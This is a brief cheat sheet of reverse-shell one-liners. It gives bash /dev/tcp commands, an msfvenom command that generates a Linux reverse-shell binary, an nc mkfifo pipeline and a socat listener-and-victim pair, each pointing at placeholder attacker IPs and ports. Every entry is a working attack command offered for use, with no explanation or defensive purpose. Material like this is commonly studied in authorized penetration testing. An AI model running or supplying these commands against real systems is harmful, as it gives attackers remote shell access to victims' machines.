# REVERSE SHELLS
#bash
```sh
/bin/bash -i >& /dev/tcp/[attacker ip]/[attacker listening port] 0>&1

force bash
/bin/bash -c '/bin/bash -i >& /dev/tcp/[attacker ip]/[attacker listening port] 0>&1' &
```

#msfvenom
```
msfvenom -p linux/x86/shell_reverse_tcp LHOST=[ip] LPORT=[port] -f elf > shell-x86.elf
```

#nc
```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc [attacker ip] [attacker listening port] >/tmp/f
```

#socat 
```
attacker> socat TCP-LISTEN:[port],reuseaddr FILE:`tty`,raw,echo=0
victim> socat TCP4:[attacker_ip]:[port] EXEC:bash,pty,stderr,setsid,sigint,sane
```